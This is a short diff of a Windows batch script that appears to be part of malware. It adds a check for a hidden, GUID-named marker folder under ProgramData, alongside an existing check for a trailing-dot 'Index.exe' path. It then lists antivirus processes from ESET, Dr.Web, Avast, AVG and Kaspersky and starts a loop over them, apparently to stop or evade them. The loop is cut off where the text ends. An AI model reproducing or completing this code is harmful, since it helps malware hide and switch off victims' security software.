@@ -1,9 +1,12 @@
 setlocal EnableDelayedExpansion
+if exist "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\" (
+    exit /b
+)
+
 if exist "%ProgramData%\logdata..\Index.exe" (
     exit /b
 )
 
-setlocal EnableDelayedExpansion
 set "processList=ekrn.exe egui.exe spideragent.exe AvastUI.exe avgui.exe avp.exe avpui.exe UninstallTool.exe UninstallToolHelper.exe"
 
 for %a in (%processList%) do (
